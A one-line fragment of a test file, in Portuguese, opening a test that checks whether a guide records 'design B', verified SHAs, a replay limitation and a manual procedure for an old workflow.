 test("documentação: o guia registra o desenho B, os SHAs conferidos, a limitação de replay e o procedimento manual do workflow antigo", () => {
